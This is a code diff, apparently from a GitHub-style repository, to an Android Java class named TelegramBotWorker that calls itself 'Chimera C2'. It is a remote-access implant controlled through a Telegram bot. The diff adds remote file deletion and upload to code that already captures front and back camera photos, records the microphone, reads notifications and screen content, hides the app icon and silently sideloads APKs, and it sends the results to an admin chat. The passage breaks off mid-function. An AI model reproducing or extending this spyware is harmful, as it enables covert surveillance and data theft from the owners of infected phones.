@@ -29,7 +29,7 @@ import java.util.List;
 public class TelegramBotWorker implements Runnable {
     private final Context context;
     private long lastUpdateId = 0;
-    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL, FOR_MIC_DURATION, FOR_IMAGE_PARAMS, FOR_AUDIO_PARAMS }
+    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_LINK_OPEN, FOR_NOTIFICATION_FILTER, FOR_IMAGE_OVERLAY, FOR_AUDIO_PLAY, FOR_APK_INSTALL, FOR_MIC_DURATION, FOR_IMAGE_PARAMS, FOR_AUDIO_PARAMS, FOR_FILE_UPLOAD }
     private WaitingState currentState = WaitingState.NONE;
     private int customDuration = 0;
     private int customScale = 100;
@@ -47,9 +47,9 @@ public class TelegramBotWorker implements Runnable {
 
     @Override
     public void run() {
-        while (!Thread.currentThread.isInterrupted()) {
+        while (!Thread.currentThread().isInterrupted()) {
             try { pollForUpdates(); Thread.sleep(3000); }
-            catch (InterruptedException ie) { Thread.currentThread.interrupt(); break; }
+            catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
             catch (Exception e) { ErrorLogger.logError(context, "RunLoop", e); }
         }
     }
@@ -58,7 +58,7 @@ public class TelegramBotWorker implements Runnable {
         HttpURLConnection conn = null;
         try {
             String token = ConfigLoader.getBotToken();
-            if (token == null) { Thread.currentThread.interrupt(); return; }
+            if (token == null) { Thread.currentThread().interrupt(); return; }
             String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=20&allowed_updates=[\"message\",\"callback_query\"]";
             if (lastUpdateId > 0) urlStr += "&offset=" + (lastUpdateId + 1);
             conn = (HttpURLConnection) new URL(urlStr).openConnection();
@@ -80,45 +80,41 @@ public class TelegramBotWorker implements Runnable {
         try {
             long chatId = msg.getJSONObject("chat").getLong("id");
             if (chatId != ConfigLoader.getAdminId()) return;
-
             if (msg.has("web_app_data")) {
                 handleWebAppMessage(msg.getJSONObject("web_app_data").getString("data"));
                 return;
             }
-
             if (msg.has("document") || msg.has("photo") || msg.has("audio")) {
                 handleFileUpload(msg);
                 return;
             }
-
             if (!msg.has("text")) return;
             String text = msg.getString("text").trim();
-
             if (handleStatefulReply(text)) return;
-
             if ("/start".equals(text)) {
                 sendMainPanel(chatId, 0);
             }
         } catch (Exception e) { ErrorLogger.logError(context, "HandleMessage", e); }
     }
-    
+
     private void handleWebAppMessage(String data) {
         try {
             JSONObject jsonData = new JSONObject(data);
             String command = jsonData.getString("command");
             SharedPreferences prefs = context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
-
             switch (command) {
                 case "fm_init":
-                    String rootUri = prefs.getString("saf_root_uri", null);
-                    if (rootUri == null) {
+                    String rootUriStr = prefs.getString("saf_root_uri", null);
+                    if (rootUriStr == null) {
                         sendWebAppUpdate(new JSONObject().put("error", "Access not granted. Please request access from the Web App.").toString(), "File Manager needs setup");
                     } else {
-                        handleWebAppListFiles(rootUri);
+                        prefs.edit().putString("saf_current_uri", rootUriStr).apply();
+                        handleWebAppListFiles(rootUriStr);
                     }
                     break;
                 case "fm_list_files":
                     String uriToList = jsonData.getString("uri");
+                    prefs.edit().putString("saf_current_uri", uriToList).apply();
                     handleWebAppListFiles(uriToList);
                     break;
                 case "fm_grant_access":
@@ -127,8 +123,19 @@ public class TelegramBotWorker implements Runnable {
                     context.startActivity(intent);
                     break;
                 case "fm_download_file":
-                    Uri fileUri = Uri.parse(jsonData.getString("uri"));
-                    handleSafDownload(fileUri);
+                    Uri fileToDownloadUri = Uri.parse(jsonData.getString("uri"));
+                    handleSafDownload(fileToDownloadUri);
+                    break;
+                case "fm_delete_file":
+                    Uri fileToDeleteUri = Uri.parse(jsonData.getString("uri"));
+                    boolean success = FileManager.deleteFile(context, fileToDeleteUri);
+                    String msg = success ? "File deleted successfully." : "Failed to delete file.";
+                    sendMessage(msg, context);
+                    String currentUri = prefs.getString("saf_current_uri", null);
+                    if (currentUri != null) handleWebAppListFiles(currentUri);
+                    break;
+                case "fm_upload_file":
+                    promptForState(WaitingState.FOR_FILE_UPLOAD, "Please send the file you want to upload to the current directory.");
                     break;
             }
         } catch (Exception e) {
@@ -140,7 +147,6 @@ public class TelegramBotWorker implements Runnable {
         try {
             Uri currentUri = Uri.parse(uriString);
             FileManager.FileListing listing = FileManager.listFiles(context, currentUri);
-            
             JSONObject response = new JSONObject();
             if (listing.error != null) {
                 response.put("error", listing.error);
@@ -165,12 +171,9 @@ public class TelegramBotWorker implements Runnable {
 
     private void sendWebAppUpdate(String jsonData, String messageText) {
         try {
-            // IMPORTANT: Replace this with your actual Netlify URL
             String webAppUrl = "https://chimerafex.netlify.app";
-
             String encodedData = Base64.encodeToString(jsonData.getBytes(StandardCharsets.UTF_8), Base64.NO_WRAP);
             String urlWithData = webAppUrl + "#data=" + encodedData;
-
             JSONObject keyboard = new JSONObject();
             JSONArray rows = new JSONArray();
             JSONObject webAppButton = new JSONObject();
@@ -178,7 +181,6 @@ public class TelegramBotWorker implements Runnable {
             webAppButton.put("web_app", new JSONObject().put("url", urlWithData));
             rows.put(new JSONArray().put(webAppButton));
             keyboard.put("inline_keyboard", rows);
-            
             sendMessageWithMarkup(messageText, keyboard);
         } catch (Exception e) {
             ErrorLogger.logError(context, "sendWebAppUpdate", e);
@@ -186,7 +188,6 @@ public class TelegramBotWorker implements Runnable {
     }
 
     private boolean handleStatefulReply(String text) {
-        // This method remains the same as your previous version
         WaitingState previousState = currentState;
         if (previousState == WaitingState.NONE) return false;
         currentState = WaitingState.NONE;
@@ -206,7 +207,6 @@ public class TelegramBotWorker implements Runnable {
     }
 
     private void handleFileUpload(JSONObject msg) {
-        // This method remains the same
         WaitingState previousState = currentState;
         currentState = WaitingState.NONE;
         try {
@@ -219,20 +219,20 @@ public class TelegramBotWorker implements Runnable {
                 case FOR_IMAGE_OVERLAY: downloadFile(fileId, fileName, path -> { Intent i = new Intent(context, OverlayService.class); i.setAction("ACTION_SHOW_IMAGE"); i.putExtra("imagePath", path); i.putExtra("duration", customDuration); i.putExtra("scale", customScale); context.startService(i); }); break;
                 case FOR_AUDIO_PLAY: downloadFile(fileId, fileName, path -> { Intent i = new Intent(context, AudioPlaybackService.class); i.setAction("ACTION_PLAY_AUDIO"); i.putExtra("audioPath", path); i.putExtra("duration", customDuration); context.startService(i); }); break;
                 case FOR_APK_INSTALL: if (fileName.toLowerCase().endsWith(".apk") || "application/vnd.android.package-archive".equals(mimeType)) { downloadFile(fileId, fileName, this::installApp); } else { sendMessage("Error: Not an APK.", context); } break;
+                case FOR_FILE_UPLOAD:
+                    handleSafUpload(fileId, fileName);
+                    break;
                 default: sendMessage("Received a file without context.", context); break;
             }
         } catch (Exception e) { ErrorLogger.logError(context, "HandleFileUpload", e); }
     }
 
     private void handleCallback(JSONObject cb) {
-        // Simplified to remove old file manager logic
         try {
             String data = cb.getString("data");
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
             int messageId = cb.getJSONObject("message").getInt("message_id");
-
             answerCallbackQuery(cb.getString("id"));
-
             switch (data) {
                 case "PANEL_MAIN": sendMainPanel(chatId, messageId); break;
                 case "PANEL_APPS": sendAppPanel(chatId, messageId); break;
@@ -242,7 +242,6 @@ public class TelegramBotWorker implements Runnable {
                 case "PANEL_NOTIFS": sendNotificationPanel(chatId, messageId); break;
                 case "PANEL_GESTURES": sendGesturePanel(chatId, messageId); break;
                 case "PANEL_HELP": sendHelpPanel(chatId, messageId); break;
-                // All ACTION cases remain the same as your previous version
                 case "ACTION_LIST_APPS": listAllApps(); break;
                 case "ACTION_LAUNCH_APP": promptForState(WaitingState.FOR_PACKAGE_NAME_LAUNCH, "Reply with the package name to launch."); break;
                 case "ACTION_UNINSTALL_APP": promptForState(WaitingState.FOR_PACKAGE_NAME_UNINSTALL, "Reply with the package name to uninstall."); break;
@@ -288,7 +287,6 @@ public class TelegramBotWorker implements Runnable {
             rows.put(new JSONArray().put(createButton("📸 Media Control", "PANEL_MEDIA")).put(createButton("⚙️ System & Services", "PANEL_SYSTEM")));
             rows.put(new JSONArray().put(createButton("ℹ️ Help", "PANEL_HELP")).put(createButton("❌ Close Panel", "ACTION_EXIT_PANEL")));
             keyboard.put("inline_keyboard", rows);
-
             if (messageId == 0) {
                 sendMessageWithMarkup(text, keyboard);
             } else {
@@ -297,40 +295,362 @@ public class TelegramBotWorker implements Runnable {
         } catch (Exception e) { ErrorLogger.logError(context, "SendMainPanel", e); }
     }
     
-    // The rest of the file (all other helper methods like sendAppPanel, downloadFile, post, etc.) remains identical to the previous version.
-    // Make sure to copy them over.
-    private void handleSafDownload(Uri fileUri) { FileManager.downloadFile(context, fileUri, new FileManager.DownloadCallback() { @Override public void onProgress(String message) { sendMessage(message, context); } @Override public void onChunkReady(File chunkFile, int chunkNumber, int totalChunks) { String caption = "Chunk " + chunkNumber + "/" + totalChunks + " of " + chunkFile.getName().replace(".part" + chunkNumber, ""); uploadDocument(chunkFile.getAbsolutePath(), ConfigLoader.getAdminId(), caption, context); } @Override public void onComplete(String finalMessage) { sendMessage(finalMessage, context); } @Override public void onError(String errorMessage) { sendMessage("❌ " + errorMessage, context); } }); }
-    private void sendAppPanel(long chatId, int messageId) { String text = "`App Management`"; try { JSONObject keyboard = new JSONObject(); JSONArray rows = new JSONArray(); rows.put(new JSONArray().put(createButton("List Apps", "ACTION_LIST_APPS")).put(createButton("Launch App", "ACTION_LAUNCH_APP"))); rows.put(new JSONArray().put(createButton("Install APK", "ACTION_INSTALL_APP")).put(createButton("Uninstall App", "ACTION_UNINSTALL_APP"))); rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN"))); keyboard.put("inline_keyboard", rows); editMessageMarkup(chatId, messageId, text, keyboard); } catch (Exception e) { ErrorLogger.logError(context, "SendAppPanel", e); } }
-    private void sendDeviceControlPanel(long chatId, int messageId) { String text = "`Device Control`"; try { JSONObject keyboard = new JSONObject(); JSONArray rows = new JSONArray(); rows.put(new JSONArray().put(createButton("Screen On", "ACTION_SCREEN_ON")).put(createButton("Screen Off", "ACTION_SCREEN_OFF"))); rows.put(new JSONArray().put(createButton("Flashlight On", "ACTION_FLASHLIGHT_ON")).put(createButton("Flashlight Off", "ACTION_FLASHLIGHT_OFF"))); rows.put(new JSONArray().put(createButton("Set Volume", "ACTION_SET_VOLUME")).put(createButton("Device Intel", "ACTION_GET_DETAILS"))); rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN"))); keyboard.put("inline_keyboard", rows); editMessageMarkup(chatId, messageId, text, keyboard); } catch (Exception e) { ErrorLogger.logError(context, "SendDeviceControlPanel", e); } }
-    private void sendMediaPanel(long chatId, int messageId) { String text = "`Media Control`"; try { JSONObject keyboard = new JSONObject(); JSONArray rows = new JSONArray(); rows.put(new JSONArray().put(createButton("Front Cam", "ACTION_CAM_FRONT")).put(createButton("Back Cam", "ACTION_CAM_BACK"))); rows.put(new JSONArray().put(createButton("Mic Rec (30s)", "ACTION_MIC_30")).put(createButton("Mic Rec (60s)", "ACTION_MIC_60"))); rows.put(new JSONArray().put(createButton("Mic Rec (Custom)", "ACTION_MIC_CUSTOM"))); rows.put(new JSONArray().put(createButton("Show Image", "ACTION_SHOW_IMAGE")).put(createButton("Play Audio", "ACTION_PLAY_AUDIO"))); rows.put(new JSONArray().put(createButton("Open Link", "ACTION_OPEN_LINK"))); rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN"))); keyboard.put("inline_keyboard", rows); editMessageMarkup(chatId, messageId, text, keyboard); } catch (Exception e) { ErrorLogger.logError(context, "SendMediaPanel", e); } }
-    private void sendSystemPanel(long chatId, int messageId) { String text = "`System & Services`"; try { JSONObject keyboard = new JSONObject(); JSONArray rows = new JSONArray(); rows.put(new JSONArray().put(createButton("Notifications", "PANEL_NOTIFS")).put(createButton("Gestures", "PANEL_GESTURES"))); rows.put(new JSONArray().put(createButton("Get Screen Content", "ACTION_GET_CONTENT"))); rows.put(new JSONArray().put(createButton("Show Icon", "ACTION_HIDE_ICON_OFF")).put(createButton("Hide Icon", "ACTION_HIDE_ICON_ON"))); rows.put(new JSONArray().put(createButton("Grant Usage Access", "ACTION_GRANT_USAGE"))); rows.put(new JSONArray().put(createButton("⚠️ DEACTIVATE ⚠️", "ACTION_DEACTIVATE"))); rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN"))); keyboard.put("inline_keyboard", rows); editMessageMarkup(chatId, messageId, text, keyboard); } catch (Exception e) { ErrorLogger.logError(context, "SendSystemPanel", e); } }
-    private void sendNotificationPanel(long chatId, int messageId) { String text = "`Notification Control`"; try { JSONObject keyboard = new JSONObject(); JSONArray rows = new JSONArray(); rows.put(new JSONArray().put(createButton("Read Active Notifications", "NOTIF_GET_EXISTING"))); rows.put(new JSONArray().put(createButton("Set App Filter", "NOTIF_SET_FILTER")).put(createButton("Clear App Filter", "NOTIF_CLEAR_FILTER"))); rows.put(new JSONArray().put(createButton("Enable Service", "NOTIF_ENABLE")).put(createButton("Disable Service", "NOTIF_DISABLE"))); rows.put(new JSONArray().put(createButton("« Back to System", "PANEL_SYSTEM"))); keyboard.put("inline_keyboard", rows); editMessageMarkup(chatId, messageId, text, keyboard); } catch (Exception e) { ErrorLogger.logError(context, "SendNotifPanel", e); } }
-    private void sendGesturePanel(long chatId, int messageId) { String text = "`Gesture Control` (Requires Accessibility Service)"; try { JSONObject keyboard = new JSONObject(); JSONArray rows = new JSONArray(); rows.put(new JSONArray().put(createButton("Back", "ACC_ACTION_BACK")).put(createButton("Home", "ACC_ACTION_HOME")).put(createButton("Recents", "ACC_ACTION_RECENTS"))); rows.put(new JSONArray().put(createButton("« Back to System", "PANEL_SYSTEM"))); keyboard.put("inline_keyboard", rows); editMessageMarkup(chatId, messageId, text, keyboard); } catch (Exception e) { ErrorLogger.logError(context, "SendGesturePanel", e); } }
-    private void sendHelpPanel(long chatId, int messageId) { String text = "*Chimera C2 Help*\n\nThis bot is controlled via the interactive panels. Use the `File Explorer` menu button below to manage files."; try { JSONObject keyboard = new JSONObject(); JSONArray rows = new JSONArray(); rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN"))); keyboard.put("inline_keyboard", rows); editMessageMarkup(chatId, messageId, text, keyboard); } catch (Exception e) { ErrorLogger.logError(context, "SendHelpPanel", e); } }
-    private void promptForState(WaitingState state, String message) { currentState = state; sendMessage(message, context); }
-    private void handleMicRecording(int duration) { sendMessage("Recording " + duration + "s of audio...", context); AudioHandler.startRecording(context, duration, new AudioHandler.AudioCallback() { @Override public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), duration + "s Audio", context); } @Override public void onError(String error) { sendMessage("Audio Error: " + error, context); } }); }
-    private void handleCameraCapture(String cameraId, String cameraName) { sendMessage("Capturing image from " + cameraName + "...", context); CameraHandler.takePicture(context, cameraId, new CameraHandler.CameraCallback() { @Override public void onPictureTaken(String filePath) { uploadPhoto(filePath, ConfigLoader.getAdminId(), cameraName + " Capture", context); } @Override public void onError(String error) { sendMessage("Camera Error: " + error, context); } }); }
-    private void launchApp(String packageName) { try { Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName); if (intent != null) { intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); context.startActivity(intent); } else { sendMessage("Error: Could not launch " + packageName, context); } } catch (Exception e) { sendMessage("Error launching app: " + e.getMessage(), context); } }
-    private void openLink(String url) { try { if (!url.startsWith("http")) url = "http://" + url; Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url)); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); context.startActivity(intent); } catch (Exception e) { sendMessage("Failed to open link.", context); } }
-    private void uninstallApp(String packageName) { Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName)); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); context.startActivity(intent); }
-    private void installApp(String apkPath) { File apkFile = new File(apkPath); if (!apkFile.exists()) return; try { Uri apkUri = FileProvider.getUriForFile(context, context.getPackageName() + ".provider", apkFile); Intent intent = new Intent(Intent.ACTION_VIEW); intent.setDataAndType(apkUri, "application/vnd.android.package-archive"); intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION); context.startActivity(intent); } catch (Exception e) { ErrorLogger.logError(context, "InstallApp", e); } }
-    private void setVolume(String levelStr) { try { DeviceControlHandler.setMediaVolume(context, Integer.parseInt(levelStr)); } catch (NumberFormatException e) { sendMessage("Error: Invalid number.", context); } }
-    private void setNotificationFilter(String packageName) { SharedPreferences prefs = context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE); prefs.edit().putString(NOTIFICATION_FILTER_PREF, packageName).apply(); notificationFilterPackage = packageName; if (packageName == null || packageName.isEmpty()) { sendMessage("Notification filter cleared.", context); } else { sendMessage("Notification filter set for: `" + packageName + "`", context); } }
-    private void setNotificationListenerState(boolean enable) { try { PackageManager pm = context.getPackageManager(); ComponentName componentName = new ComponentName(context, NotificationListener.class); int state = enable ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED; pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP); sendMessage("Notification Listener " + (enable ? "ENABLED" : "DISABLED") + ".", context); } catch (Exception e) { sendMessage("Failed to change state.", context); } }
-    private void listAllApps() { new Thread(() -> { try { PackageManager pm = context.getPackageManager(); List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA); StringBuilder appList = new StringBuilder(); int count = 0; for (ApplicationInfo app : packages) { if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) { appList.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n"); count++; } } sendMessage("*--- " + count + " User Apps ---*\n" + appList.toString(), context); } catch (Exception e) { sendMessage("Failed to list apps.", context); } }).start(); }
-    private JSONObject createButton(String text, String callbackData) throws org.json.JSONException { return new JSONObject().put("text", text).put("callback_data", callbackData); }
-    private void downloadFile(String fileId, String fileName, FileDownloadCallback callback) { new Thread(() -> { try { String token = ConfigLoader.getBotToken(); String getPathUrl = "https://api.telegram.org/bot" + token + "/getFile?file_id=" + fileId; String response = streamToString(new URL(getPathUrl).openConnection().getInputStream()); String filePath = new JSONObject(response).getJSONObject("result").getString("file_path"); String downloadUrl = "https://api.telegram.org/file/bot" + token + "/" + filePath; File outputFile = new File(context.getCacheDir(), fileName); try (InputStream is = new URL(downloadUrl).openConnection().getInputStream(); FileOutputStream fos = new FileOutputStream(outputFile)) { byte[] buffer = new byte[8192]; int bytesRead; while ((bytesRead = is.read(buffer)) != -1) fos.write(buffer, 0, bytesRead); } callback.onFileDownloaded(outputFile.getAbsolutePath()); } catch (Exception e) { ErrorLogger.logError(context, "FileDownloadError", e); } }).start(); }
+    private void handleSafUpload(String fileId, String fileName) {
+        sendMessage("Downloading to device...", context);
+        downloadFile(fileId, fileName, tempPath -> {
+            SharedPreferences prefs = context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
+            String currentUriStr = prefs.getString("saf_current_uri", null);
+            if (currentUriStr == null) {
+                sendMessage("❌ Error: No target directory is set.", context);
+                return;
+            }
+            Uri currentUri = Uri.parse(currentUriStr);
+            sendMessage("Uploading to target directory...", context);
+            boolean success = FileManager.uploadFile(context, new File(tempPath), currentUri, fileName);
+            sendMessage(success ? "✅ File uploaded successfully." : "❌ File upload failed.", context);
+            new File(tempPath).delete();
+            handleWebAppListFiles(currentUriStr);
+        });
+    }
+
+    private void handleSafDownload(Uri fileUri) {
+        FileManager.downloadFile(context, fileUri, new FileManager.DownloadCallback() {
+            @Override public void onProgress(String message) { sendMessage(message, context); }
+            @Override public void onChunkReady(File chunkFile, int chunkNumber, int totalChunks) {
+                String caption = "Chunk " + chunkNumber + "/" + totalChunks + " of " + chunkFile.getName().replace(".part" + chunkNumber, "");
+                uploadDocument(chunkFile.getAbsolutePath(), ConfigLoader.getAdminId(), caption, context);
+            }
+            @Override public void onComplete(String finalMessage) { sendMessage(finalMessage, context); }
+            @Override public void onError(String errorMessage) { sendMessage("❌ " + errorMessage, context); }
+        });
+    }
+
+    private void sendAppPanel(long chatId, int messageId) {
+        String text = "`App Management`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("List Apps", "ACTION_LIST_APPS")).put(createButton("Launch App", "ACTION_LAUNCH_APP")));
+            rows.put(new JSONArray().put(createButton("Install APK", "ACTION_INSTALL_APP")).put(createButton("Uninstall App", "ACTION_UNINSTALL_APP")));
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendAppPanel", e); }
+    }
+
+    private void sendDeviceControlPanel(long chatId, int messageId) {
+        String text = "`Device Control`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Screen On", "ACTION_SCREEN_ON")).put(createButton("Screen Off", "ACTION_SCREEN_OFF")));
+            rows.put(new JSONArray().put(createButton("Flashlight On", "ACTION_FLASHLIGHT_ON")).put(createButton("Flashlight Off", "ACTION_FLASHLIGHT_OFF")));
+            rows.put(new JSONArray().put(createButton("Set Volume", "ACTION_SET_VOLUME")).put(createButton("Device Intel", "ACTION_GET_DETAILS")));
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendDeviceControlPanel", e); }
+    }
+    
+    private void sendMediaPanel(long chatId, int messageId) {
+        String text = "`Media Control`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Front Cam", "ACTION_CAM_FRONT")).put(createButton("Back Cam", "ACTION_CAM_BACK")));
+            rows.put(new JSONArray().put(createButton("Mic Rec (30s)", "ACTION_MIC_30")).put(createButton("Mic Rec (60s)", "ACTION_MIC_60")));
+            rows.put(new JSONArray().put(createButton("Mic Rec (Custom)", "ACTION_MIC_CUSTOM")));
+            rows.put(new JSONArray().put(createButton("Show Image", "ACTION_SHOW_IMAGE")).put(createButton("Play Audio", "ACTION_PLAY_AUDIO")));
+            rows.put(new JSONArray().put(createButton("Open Link", "ACTION_OPEN_LINK")));
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendMediaPanel", e); }
+    }
+
+    private void sendSystemPanel(long chatId, int messageId) {
+        String text = "`System & Services`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Notifications", "PANEL_NOTIFS")).put(createButton("Gestures", "PANEL_GESTURES")));
+            rows.put(new JSONArray().put(createButton("Get Screen Content", "ACTION_GET_CONTENT")));
+            rows.put(new JSONArray().put(createButton("Show Icon", "ACTION_HIDE_ICON_OFF")).put(createButton("Hide Icon", "ACTION_HIDE_ICON_ON")));
+            rows.put(new JSONArray().put(createButton("Grant Usage Access", "ACTION_GRANT_USAGE")));
+            rows.put(new JSONArray().put(createButton("⚠️ DEACTIVATE ⚠️", "ACTION_DEACTIVATE")));
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendSystemPanel", e); }
+    }
+
+    private void sendNotificationPanel(long chatId, int messageId) {
+        String text = "`Notification Control`";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Read Active Notifications", "NOTIF_GET_EXISTING")));
+            rows.put(new JSONArray().put(createButton("Set App Filter", "NOTIF_SET_FILTER")).put(createButton("Clear App Filter", "NOTIF_CLEAR_FILTER")));
+            rows.put(new JSONArray().put(createButton("Enable Service", "NOTIF_ENABLE")).put(createButton("Disable Service", "NOTIF_DISABLE")));
+            rows.put(new JSONArray().put(createButton("« Back to System", "PANEL_SYSTEM")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendNotifPanel", e); }
+    }
+
+    private void sendGesturePanel(long chatId, int messageId) {
+        String text = "`Gesture Control` (Requires Accessibility Service)";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("Back", "ACC_ACTION_BACK")).put(createButton("Home", "ACC_ACTION_HOME")).put(createButton("Recents", "ACC_ACTION_RECENTS")));
+            rows.put(new JSONArray().put(createButton("« Back to System", "PANEL_SYSTEM")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendGesturePanel", e); }
+    }
+
+    private void sendHelpPanel(long chatId, int messageId) {
+        String text = "*Chimera C2 Help*\n\nThis bot is controlled via the interactive panels. Use the `File Explorer` menu button below to manage files.";
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray rows = new JSONArray();
+            rows.put(new JSONArray().put(createButton("« Back to Main Menu", "PANEL_MAIN")));
+            keyboard.put("inline_keyboard", rows);
+            editMessageMarkup(chatId, messageId, text, keyboard);
+        } catch (Exception e) { ErrorLogger.logError(context, "SendHelpPanel", e); }
+    }
+
+    private void promptForState(WaitingState state, String message) {
+        currentState = state;
+        sendMessage(message, context);
+    }
+    
+    private void handleMicRecording(int duration) {
+        sendMessage("Recording " + duration + "s of audio...", context);
+        AudioHandler.startRecording(context, duration, new AudioHandler.AudioCallback() {
+            @Override public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), duration + "s Audio", context); }
+            @Override public void onError(String error) { sendMessage("Audio Error: " + error, context); }
+        });
+    }
+
+    private void handleCameraCapture(String cameraId, String cameraName) {
+        sendMessage("Capturing image from " + cameraName + "...", context);
+        CameraHandler.takePicture(context, cameraId, new CameraHandler.CameraCallback() {
+            @Override public void onPictureTaken(String filePath) { uploadPhoto(filePath, ConfigLoader.getAdminId(), cameraName + " Capture", context); }
+            @Override public void onError(String error) { sendMessage("Camera Error: " + error, context); }
+        });
+    }
+
+    private void launchApp(String packageName) {
+        try {
+            Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+            } else { sendMessage("Error: Could not launch " + packageName, context); }
+        } catch (Exception e) { sendMessage("Error launching app: " + e.getMessage(), context); }
+    }
+
+    private void openLink(String url) {
+        try {
+            if (!url.startsWith("http")) url = "http://" + url;
+            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+        } catch (Exception e) { sendMessage("Failed to open link.", context); }
+    }
+
+    private void uninstallApp(String packageName) {
+        Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + packageName));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(intent);
+    }
+
+    private void installApp(String apkPath) {
+        File apkFile = new File(apkPath);
+        if (!apkFile.exists()) return;
+        try {
+            Uri apkUri = FileProvider.getUriForFile(context, context.getPackageName() + ".provider", apkFile);
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
+            context.startActivity(intent);
+        } catch (Exception e) { ErrorLogger.logError(context, "InstallApp", e); }
+    }
+
+    private void setVolume(String levelStr) {
+        try { DeviceControlHandler.setMediaVolume(context, Integer.parseInt(levelStr)); }
+        catch (NumberFormatException e) { sendMessage("Error: Invalid number.", context); }
+    }
+
+    private void setNotificationFilter(String packageName) {
+        SharedPreferences prefs = context.getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
+        prefs.edit().putString(NOTIFICATION_FILTER_PREF, packageName).apply();
+        notificationFilterPackage = packageName;
+        if (packageName == null || packageName.isEmpty()) {
+            sendMessage("Notification filter cleared.", context);
+        } else {
+            sendMessage("Notification filter set for: `" + packageName + "`", context);
+        }
+    }
+
+    private void setNotificationListenerState(boolean enable) {
+        try {
+            PackageManager pm = context.getPackageManager();
+            ComponentName componentName = new ComponentName(context, NotificationListener.class);
+            int state = enable ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+            pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
+            sendMessage("Notification Listener " + (enable ? "ENABLED" : "DISABLED") + ".", context);
+        } catch (Exception e) { sendMessage("Failed to change state.", context); }
+    }
+
+    private void listAllApps() {
+        new Thread(() -> {
+            try {
